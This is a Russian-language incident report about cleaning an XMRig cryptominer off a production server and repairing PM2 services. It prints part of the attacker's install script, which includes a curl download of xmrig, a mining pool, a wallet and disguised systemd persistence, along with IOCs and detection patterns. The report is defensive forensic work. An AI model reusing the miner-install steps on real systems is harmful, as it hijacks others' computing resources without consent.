# Отчет о прогрессе - 11 декабря 2025

## Обзор

Сегодня выполнена работа по обнаружению и удалению вредоносного ПО (криптомайнера) с production сервера, исправлению конфигурации PM2 и восстановлению нормальной работы сервисов.

## Обнаруженные угрозы

### 1. Криптомайнер XMRig

**Расположение:** `~/projects/zakaz-2/`

| Файл | Описание | Размер |
|------|----------|--------|
| `xmrig-6.24.0/` | Директория с майнером Monero | 8.3 MB |
| `xmrig-6.24.0/xmrig` | Исполняемый файл майнера | 8.3 MB |
| `sex.sh` | Скрипт установки майнера | 1.6 KB |
| `kal.tar.gz` | Архив с майнером | 3.5 MB |
| `solra` | Подозрительный бинарник (обфусцированный) | 2.2 MB |
| `linux_amd64` | Go-бинарник (возможно дроппер) | 2 MB |

#### Анализ скрипта sex.sh

```bash
#!/bin/bash
TAR_FILE="kal.tar.gz"
EXTRACT_DIR="xmrig-6.24.0"
BINARY_PATH="$(pwd)/$EXTRACT_DIR/xmrig"
ARGS="--url pool.hashvault.pro:443 --user 88tGYBwhWNzGe... --pass next --donate-level 0 --tls"

# Скачивает xmrig с GitHub
curl -L -o "$TAR_FILE" https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz

# Пытается установить как systemd сервис "system-update-service"
# Если нет root прав - запускает через nohup
```

**Пул майнинга:** `pool.hashvault.pro:443`
**Кошелек Monero:** `88tGYBwhWNzGesQs5QkwE1PdBa1tXGb9dcjxrdwujU3SEs3i7psaoJc4KmrDvv4VPTNtXazDWGkvGGfqurdBggvPEhZ43DJ`

---

### 2. Инъекция в .bashrc

**Ранее обнаружено и удалено:**
- Строка с `nohup...05bf0e9b` в `~/.bashrc`
- Скрытый JS файл `.kxnzl4mtez.js`
- Файлы в `/tmp`: `fghgf`, `ijnegrrinje.json`

---

### 3. Сломанные PM2 процессы

| Процесс | Проблема | Рестартов | CPU |
|---------|----------|-----------|-----|
| `zakaz-2` | Неправильная команда `next start 5000` | 664 | 300% |
| `n8n` (root) | Модуль `/usr/bin/n8n` не найден | 410,000+ | 100% |

**Причина высокой нагрузки:** PM2 бесконечно перезапускал падающие процессы, создавая load average 15-17.

---

## Выполненные действия

### 1. Удаление вредоносных файлов

```bash
# Удаление криптомайнера и связанных файлов
rm -rf ~/projects/zakaz-2/xmrig-6.24.0
rm -f ~/projects/zakaz-2/linux_amd64
rm -f ~/projects/zakaz-2/solra
rm -f ~/projects/zakaz-2/sex.sh
rm -f ~/projects/zakaz-2/kal.tar.gz
```

**Статус:** ✅ Выполнено

---

### 2. Проверка systemd сервисов

```bash
# Проверка наличия вредоносного сервиса
sudo systemctl status system-update-service
```

**Результат:** Сервис не был установлен (скрипт не имел root прав)

**Статус:** ✅ Чисто

---

### 3. Исправление PM2

#### Остановка сломанных процессов

```bash
# Остановка zakaz-2 (неправильная конфигурация)
pm2 stop zakaz-2 && pm2 delete zakaz-2

# Остановка n8n (дублирует Docker контейнер)
sudo pm2 stop n8n && sudo pm2 delete n8n
```

#### Правильный запуск zakaz-2

```bash
cd ~/projects/zakaz-2 && pm2 start npm --name "zakaz-2" -- start
pm2 save --force
```

**Статус:** ✅ Работает

---

### 4. Проверка crontab

```bash
crontab -l 2>/dev/null | grep -E "sex|xmrig|solra|linux_amd64"
```

**Результат:** Вредоносных записей не найдено

**Статус:** ✅ Чисто

---

### 5. Проверка Git репозитория

```bash
git ls-files | grep -E "xmrig|solra|linux_amd64|sex\.sh|kal\.tar"
```

**Результат:** Вирусных файлов в репозитории нет

**Статус:** ✅ GitHub чистый

---

## Результаты

### Нагрузка сервера

| Метрика | До очистки | После очистки | Изменение |
|---------|------------|---------------|-----------|
| Load Average (1 min) | 17.66 | 2.97 | -83% |
| Load Average (5 min) | 15.19 | 5.17 | -66% |
| Load Average (15 min) | 15.40 | 9.63 | -37% |

---

### Статус сервисов после очистки

| Сервис | Способ запуска | Порт | Статус |
|--------|---------------|------|--------|
| **zakaz-2** | PM2 | 3000 | ✅ Работает |
| **n8n** | Docker | 5678 | ✅ Работает |
| **Supabase** | Docker (12 контейнеров) | 8000 | ✅ Работает |
| **Nginx** | Systemd | 80/443 | ✅ Работает |

---

### Проверка работы zakaz-2

```
   ▲ Next.js 15.5.4
   - Local:        http://localhost:3000
   - Network:      http://78.140.57.33:3000

 ✓ Starting...
 ✓ Ready in 3.9s
```

**Сайт:** https://zakaz2.tomica.ru - работает

---

## Анализ вектора атаки

### Вероятные способы проникновения

1. **Уязвимый npm пакет** - злоумышленник мог получить доступ через зависимость
2. **SSH брутфорс** - подбор пароля к серверу
3. **Скомпрометированные ключи** - утечка SSH ключей

### Индикаторы компрометации (IOC)

| Тип | Значение |
|-----|----------|
| Процесс | `xmrig` |
| Пул | `pool.hashvault.pro:443` |
| Кошелек | `88tGYBwhWNzGe...` |
| Файл | `.kxnzl4mtez.js` |
| Файл | `.05bf0e9b` паттерн |
| Systemd сервис | `system-update-service` |

---

## Рекомендации по безопасности

### Немедленные действия

- [x] Удалить вредоносные файлы
- [x] Остановить сломанные PM2 процессы
- [x] Проверить crontab
- [x] Проверить systemd сервисы
- [x] Проверить Git репозиторий

### Рекомендуемые действия

- [ ] Сменить SSH ключи для доступа к серверу
- [ ] Проверить и обновить пароли
- [x] Настроить fail2ban для защиты от брутфорса *(выполнено 12.12.2025)*
- [ ] Включить двухфакторную аутентификацию
- [x] Проверить authorized_keys на наличие неизвестных ключей *(выполнено 12.12.2025)*
- [x] Аудит зависимостей npm (`npm audit`) *(выполнено 12.12.2025)*
- [x] Обновить Next.js до безопасной версии *(выполнено 12.12.2025 - 15.5.9)*

> **Примечание:** Дополнительные действия выполнены 12.12.2025, см. [отчет от 12.12.2025](./2025-12-12-security-hardening.md)

### Мониторинг

Регулярно проверять:
```bash
# Подозрительные процессы
ps aux | grep -E "xmrig|miner|\.js" | grep -v grep

# Нагрузка
uptime

# Новые файлы в проекте
find ~/projects/zakaz-2 -type f -mtime -1 -name "*.sh" -o -name "*.js" | grep -v node_modules
```

---

## Технические детали

### Проверенные файлы и директории

| Путь | Статус |
|------|--------|
| `~/.bashrc` | ✅ Чисто |
| `~/.profile` | ✅ Чисто |
| `~/.ssh/authorized_keys` | ✅ Только github-actions |
| `/etc/crontab` | ✅ Чисто |
| `/etc/cron.d/` | ✅ Чисто |
| `/etc/systemd/system/` | ✅ Чисто |
| `~/projects/zakaz-2/` | ✅ Очищено |

### Команды диагностики

```bash
# Поиск скрытых JS файлов
sudo find / -name ".*.js" -type f 2>/dev/null | grep -v node_modules

# Проверка процессов по CPU
ps aux --sort=-%cpu | head -20

# Docker статистика
docker stats --no-stream

# PM2 статус
pm2 list
sudo pm2 list
```

---

## Статистика сессии

- **Время работы:** ~1.5 часа
- **Вредоносных файлов удалено:** 6
- **PM2 процессов исправлено:** 2
- **Снижение нагрузки:** с 17 до 3 (в 5.5 раз)
- **Сервисов восстановлено:** 1 (zakaz-2)

---

## Заключение

Сервер был скомпрометирован криптомайнером XMRig, который создавал высокую нагрузку на CPU. Дополнительно, неправильно настроенные PM2 процессы (zakaz-2 и n8n) бесконечно перезапускались, усугубляя проблему.

После очистки:
- Все вредоносные файлы удалены
- PM2 процессы исправлены
- Нагрузка снизилась с 17 до 3
- Сайт zakaz2.tomica.ru работает нормально

Рекомендуется провести аудит безопасности и сменить учетные данные.

---

**Дата:** 11 декабря 2025
**Сервер:** n8n (78.140.57.33) / zakaz2.tomica.ru
**Ветка:** `claude/review-conversation-history-015wcseFdxuY8m87JKfigZuG`
**Статус:** ✅ Очистка завершена, сервисы работают
